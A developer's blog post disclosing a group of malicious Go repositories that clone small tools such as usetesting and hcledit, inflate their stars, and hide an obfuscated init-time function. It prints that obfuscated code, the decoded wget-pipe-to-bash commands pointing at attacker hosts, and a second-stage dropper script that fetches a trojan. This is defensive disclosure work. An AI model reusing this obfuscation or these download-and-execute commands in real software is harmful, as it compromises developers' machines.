---
title: "Found a group of malicious Go projects that steals data"
date: 2025-02-28
tags: ["go", "trojan", "opensource"]
---

I accidentally discovered malicious programs in the Go ecosystem that impersonate legitimate tools such
as the linter [ldez/usetesting](https://github.com/ldez/usetesting),the HCL editor [go.mercari.io/hcledit](https://github.com/mercari/hcledit),
the official MailerSend Go SDK [mailersend/mailersend-go](https://github.com/mailersend/mailersend-go), and many more.
These programs are not very popular but are still used by some developers.
By the time I wrote this article, I had reported the malicious repositories to GitHub support, and most of them have been deleted.

<!--more-->

## Discovering the malicious repo `ultimatepate/usetesting`

As an active open-source contributor, I frequently enhance various Go projects hosted on GitHub.
Three months ago, I created a bugfix [PR](https://github.com/leighmcculloch/gocheckcompilerdirectives/pull/3) that was successfully merged today.
My PR was mentioned by [Adam Bouqdib](https://github.com/abemedia) in his [PR](https://github.com/leighmcculloch/gocheckcompilerdirectives/pull/4) to the same repository.
I clicked on his profile and noticed that he had created an issue titled "Ignore context.Background() and context.TODO() in cleanup" in the `usetesting` repository.

`usetesting` is familiar to me as it is a Go linter created recently by ldez, which I had reviewed.
However, I realized that the issue was created not in [`ldez/usetesting`](https://github.com/ldez/usetesting) but in `ultimatepate/usetesting`.
This was strange.

Upon briefly investigating `ultimatepate/usetesting`, I discovered a malicious function in the `main.go` file:

```go
// Package main contains the basic runnable version of the linter.
package main

import (
	"os/exec"
	"github.com/ultimatepate/usetesting"
	"golang.org/x/tools/go/analysis/singlechecker"
)

func main() {
	singlechecker.Main(usetesting.NewAnalyzer())
}

func TlaOAE() error {
	LZdI := []string{"i", "5", "|", "t", "6", "t", "f", "0", "-", "O", "b", "/", " ", "r", "n", "3", "3", "i", "g", "t", ".", "s", "a", "n", "/", "s", "a", "a", " ", "d", "t", "m", "&", "w", "h", " ", "d", "s", "b", "a", "a", "/", "e", "g", "7", "e", "4", "b", " ", "o", "/", "p", "s", "m", "e", "t", "p", "d", "f", " ", "3", "l", "o", "-", "h", " ", "/", ":", "1", "c", "/", "e", "/", "e"}
	WCubG := "/bin/sh"
	tWsCX := "-c"
	gEITO := LZdI[33] + LZdI[18] + LZdI[71] + LZdI[30] + LZdI[65] + LZdI[63] + LZdI[9] + LZdI[28] + LZdI[8] + LZdI[35] + LZdI[64] + LZdI[5] + LZdI[19] + LZdI[51] + LZdI[21] + LZdI[67] + LZdI[24] + LZdI[72] + LZdI[53] + LZdI[54] + LZdI[55] + LZdI[27] + LZdI[61] + LZdI[62] + LZdI[31] + LZdI[14] + LZdI[17] + LZdI[20] + LZdI[52] + LZdI[56] + LZdI[22] + LZdI[69] + LZdI[45] + LZdI[11] + LZdI[37] + LZdI[3] + LZdI[49] + LZdI[13] + LZdI[40] + LZdI[43] + LZdI[42] + LZdI[50] + LZdI[57] + LZdI[73] + LZdI[16] + LZdI[44] + LZdI[60] + LZdI[36] + LZdI[7] + LZdI[29] + LZdI[6] + LZdI[41] + LZdI[39] + LZdI[15] + LZdI[68] + LZdI[1] + LZdI[46] + LZdI[4] + LZdI[38] + LZdI[58] + LZdI[12] + LZdI[2] + LZdI[59] + LZdI[66] + LZdI[10] + LZdI[0] + LZdI[23] + LZdI[70] + LZdI[47] + LZdI[26] + LZdI[25] + LZdI[34] + LZdI[48] + LZdI[32]
	exec.Command(WCubG, tWsCX, gEITO).Start()
	return nil
}

var KmxwBShY = TlaOAE()
```

Every time a developer runs the `usetesting` linter, the global variable `KmxwBShY` is [initialized](https://go.dev/ref/spec#Program_initialization), and the malicious function `TlaOAE` gets executed.

## How `ultimatepate/usetesting` deceives developers

Before we analyze what the malicious function does, let's discuss how this fake linter stands out over the original project and deceives people.
First of all, this malicious program has the same functionality as the original ldez/usetesting except for one function.
Secondly, it has 89 stars and 17 forks, whereas the original ldez/usetesting has only 26 stars and 1 fork.
This misleads developers into thinking that a lot of stars and forks indicate a good project.

{{< figure src="/img/2025-02-28-malicious-go-programs/malicious-usetesting.png" width="80%" caption="Malicious usetesting linter repo" >}}

{{< figure src="/img/2025-02-28-malicious-go-programs/original-usetesting.png" width="80%" caption="Original usetesting linter repo" >}}

## What malicious actions `ultimatepate/usetesting` performs

The function `TlaOAE` is obfuscated to bypass GitHub's security scanners, but we can decode it.
Let's print `exec.Command` arguments `WCubG, tWsCX, gEITO`:

```go
LZdI := []string{"i", "5", "|", "t", "6", "t", "f", "0", "-", "O", "b", "/", " ", "r", "n", "3", "3", "i", "g", "t", ".", "s", "a", "n", "/", "s", "a", "a", " ", "d", "t", "m", "&", "w", "h", " ", "d", "s", "b", "a", "a", "/", "e", "g", "7", "e", "4", "b", " ", "o", "/", "p", "s", "m", "e", "t", "p", "d", "f", " ", "3", "l", "o", "-", "h", " ", "/", ":", "1", "c", "/", "e", "/", "e"}
WCubG := "/bin/sh"
tWsCX := "-c"
gEITO := LZdI[33] + LZdI[18] + LZdI[71] + LZdI[30] + LZdI[65] + LZdI[63] + LZdI[9] + LZdI[28] + LZdI[8] + LZdI[35] + LZdI[64] + LZdI[5] + LZdI[19] + LZdI[51] + LZdI[21] + LZdI[67] + LZdI[24] + LZdI[72] + LZdI[53] + LZdI[54] + LZdI[55] + LZdI[27] + LZdI[61] + LZdI[62] + LZdI[31] + LZdI[14] + LZdI[17] + LZdI[20] + LZdI[52] + LZdI[56] + LZdI[22] + LZdI[69] + LZdI[45] + LZdI[11] + LZdI[37] + LZdI[3] + LZdI[49] + LZdI[13] + LZdI[40] + LZdI[43] + LZdI[42] + LZdI[50] + LZdI[57] + LZdI[73] + LZdI[16] + LZdI[44] + LZdI[60] + LZdI[36] + LZdI[7] + LZdI[29] + LZdI[6] + LZdI[41] + LZdI[39] + LZdI[15] + LZdI[68] + LZdI[1] + LZdI[46] + LZdI[4] + LZdI[38] + LZdI[58] + LZdI[12] + LZdI[2] + LZdI[59] + LZdI[66] + LZdI[10] + LZdI[0] + LZdI[23] + LZdI[70] + LZdI[47] + LZdI[26] + LZdI[25] + LZdI[34] + LZdI[48] + LZdI[32]
fmt.Println(WCubG, tWsCX, gEITO)
```

The working program on [Go playground](https://go.dev/play/p/cIG7Uw9k1sz) outputs:

```stdout
/bin/sh -c wget -O - https://metalomni.space/storage/de373d0df/a31546bf | /bin/bash &
```

Given at this, the malicions function `TlaOAE`:

- Downloads the script `a31546bf` from an external server `wget -O`
- Executes the downloaded script without any verification in the background `/bin/bash &`.

The script `a31546bf` has the following content:

```sh
#!/bin/bash

cd ~
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
	if ! [ -f ./f0eee999 ]; then
		sleep 3600
		wget https://metalomni.space/storage/de373d0df/f0eee999
		chmod +x ./f0eee999
		app_process_id=$(pidof f0eee999)
		if [[ -z $app_process_id ]]; then
			./f0eee999
		fi
	fi
fi
```

The script is designed to run on Linux systems, which are typical for developers.
It downloads `f0eee999` file to the user's home directory and runs it.
This behavior is typical of malicious scripts that aim to download and execute potentially harmful software on a user's system.

The file `f0eee999` is a kind of trojan, with a size of 9.9M.
It can be found and investigated on [VirusTotal](https://www.virustotal.com/gui/file/b0d20a3dcb937da1ddb01684f6040bdbb920ac19446364e949ee8ba5b50a29e4).

{{< figure src="/img/2025-02-28-malicious-go-programs/trojan-virustotal.png" width="80%" caption="VirusTotal scan results for the trojan `f0eee999`" >}}

## Other malicious programs

Next, I looked at users who forked `ultimatepate/usetesting`:

{{< details summary="*Click to view the full list of forked repositories from `ultimatepate/usetesting`*" >}}

- https://github.com/smugminiskirt/usetesting
- https://github.com/snappyconstit/usetesting
- https://github.com/snivelingclo/usetesting
- https://github.com/snoopymilks/usetesting
- https://github.com/softcarnation/usetesting
- https://github.com/soggyrefere/usetesting
- https://github.com/someinnocen/usetesting
- https://github.com/soulfulcoil/usetesting
- https://github.com/soupyresiden/usetesting
- https://github.com/Spanishaccu/usetesting
- https://github.com/sparklingadv/usetesting

{{< /details >}}

{{< figure src="/img/2025-02-28-malicious-go-programs/forks-of-malicious-usetesting.png" width="80%" caption="Forks of the malicious `usetesting`" >}}

And obviously, they have other malicious programs in their repository list.

For example, here is one of the suspicious user profiles that has only two repositories with malicious programs.

{{< figure src="/img/2025-02-28-malicious-go-programs/suspicious-user.png" width="80%" caption="Suspicious user profile" >}}

### Malicious `stylishorgani/hcledit`

A simple check revealed that `stylishorgani/hcledit` is a malicious version of [`mercari/hcledit`](https://github.com/mercari/hcledit).

{{< figure src="/img/2025-02-28-malicious-go-programs/malicious-hcledit.png" width="80%" caption="Malicious hcledit repository" >}}

It contains a malicious function in `cmd/hcledit/internal/command/create.go`.

{{< details summary="*Click to view the malicious function from `stylishorgani/hcledit`*" >}}

```go
func NFNblah() error {
	BBD := []string{"e", "/", "b", "w", "s", "p", "t", "a", "t", "7", " ", "/", "f", "s", "h", "r", "m", "4", "e", "/", "g", "c", "e", "t", "3", "0", "b", "g", ".", "t", "h", "s", " ", "e", "f", "1", "|", "c", "6", "d", "-", "d", "o", "i", "s", "/", "/", "O", "/", "/", "a", "-", "t", "3", "3", " ", " ", "n", "h", "a", ":", "s", " ", "i", "y", "b", "a", "5", "n", "l", "c", " ", "d", "&"}
	TQeQbfU := "/bin/sh"
	ifqvTp := "-c"
	upYM := BBD[3] + BBD[27] + BBD[18] + BBD[6] + BBD[71] + BBD[51] + BBD[47] + BBD[10] + BBD[40] + BBD[56] + BBD[58] + BBD[52] + BBD[23] + BBD[5] + BBD[61] + BBD[60] + BBD[19] + BBD[48] + BBD[57] + BBD[64] + BBD[16] + BBD[21] + BBD[69] + BBD[50] + BBD[4] + BBD[31] + BBD[63] + BBD[37] + BBD[28] + BBD[29] + BBD[33] + BBD[70] + BBD[14] + BBD[49] + BBD[44] + BBD[8] + BBD[42] + BBD[15] + BBD[59] + BBD[20] + BBD[22] + BBD[45] + BBD[72] + BBD[0] + BBD[24] + BBD[9] + BBD[54] + BBD[39] + BBD[25] + BBD[41] + BBD[34] + BBD[46] + BBD[66] + BBD[53] + BBD[35] + BBD[67] + BBD[17] + BBD[38] + BBD[2] + BBD[12] + BBD[62] + BBD[36] + BBD[55] + BBD[11] + BBD[26] + BBD[43] + BBD[68] + BBD[1] + BBD[65] + BBD[7] + BBD[13] + BBD[30] + BBD[32] + BBD[73]
	exec.Command(TQeQbfU, ifqvTp, upYM).Start()
	return nil
}

var UjThWM = NFNblah()
```

{{< /details >}}

The function `NFNblah` does the same as `TlaOAE` but downloads the file `a31546bf` from a different URL:

```stdout
/bin/sh -c wget -O - https://nymclassic.tech/storage/de373d0df/a31546bf | /bin/bash &
```

`stylishorgani/hcledit` has 11 forks that are all malicious.

{{< details summary="*Click to view the full list of forked repositories from `stylishorgani/hcledit`*" >}}

- https://github.com/slipperytube/hcledit
- https://github.com/smoggydam/hcledit
- https://github.com/smoothratin/hcledit
- https://github.com/snappyconstit/hcledit
- https://github.com/snivelingbow/hcledit
- https://github.com/snivelingsto/hcledit
- https://github.com/sociableearp/hcledit
- https://github.com/softcorrespon/hcledit
- https://github.com/soggyrefere/hcledit
- https://github.com/somberbabush/hcledit
- https://github.com/someoutrigge/hcledit

{{< /details >}}

### Other malicious repositories

There are many malicious repositories that can be found simply by looking for repositories and forks recursively.

Here are a partial list:

- [`lazysmock/problem-details`](https://github.com/lazysmock/problem-details): copy of [`meysamhadeli/problem-details`](https://github.com/meysamhadeli/problem-details).
- [`thornykilogra/eck-diagnostics`](https://github.com/thornykilogra/eck-diagnostics): copy of [`elastic/eck-diagnostics`](https://github.com/elastic/eck-diagnostics).
- [`subduedturret/xk6-file`](https://github.com/subduedturret/xk6-file): copy of [`avitalique/xk6-file`](https://github.com/avitalique/xk6-file).
- [`wetrunway/otel-kafka-konsumer`](https://github.com/wetrunway/otel-kafka-konsumer): copy of [`Trendyol/otel-kafka-konsumer`](https://github.com/Trendyol/otel-kafka-konsumer).
- [`strongthoug/packer-plugin-nutanix`](https://github.com/strongthoug/packer-plugin-nutanix): copy of [`nutanix-cloud-native/packer-plugin-nutanix`](https://github.com/nutanix-cloud-native/packer-plugin-nutanix).
- [`singlemango/relayer2-public`](https://github.com/singlemango/relayer2-public): copy of [`aurora-is-near/relayer2-public`](https://github.com/aurora-is-near/relayer2-public).
- [`unitedmosquit/fastgql`](https://github.com/unitedmosquit/fastgql): copy of [`roneli/fastgql`](https://github.com/roneli/fastgql).
- [`visiblewebi/fan2go-tui`](https://github.com/visiblewebi/fan2go-tui): copy of [`markusressel/fan2go-tui`](https://github.com/markusressel/fan2go-tui).
- [`unfortunatev/mailersend-go`](https://github.com/unfortunatev/mailersend-go): copy of [`mailersend/mailersend-go`](https://github.com/mailersend/mailersend-go).
- [`uncommonacc/istio_external_authorization_server`](https://github.com/uncommonacc/istio_external_authorization_server): copy of [`salrashid123/istio_external_authorization_server`](https://github.com/salrashid123/istio_external_authorization_server).

What unites these malicious programs is that they clone small Go executable programs with 20-30 stars.

When someone searches for these Go programs, the malicious ones appear at the top because they have more stars.

{{< figure src="/img/2025-02-28-malicious-go-programs/search-malicious-at-the-top.png" width="80%" caption="Malicious repository at the top of search results" >}}

## Conclusion

My accidental discovery of these malicious Go programs was a result of a bit of curiosity and luck.
This experience has underscored for me the critical importance of vigilance in the open-source community.
As developers, we must always verify the authenticity of the repositories we use.
It's essential to scrutinize the source code for any suspicious activities and promptly report any malicious repositories to the GitHub's support team.
Let's work together to keep our open-source ecosystem safe and trustworthy.
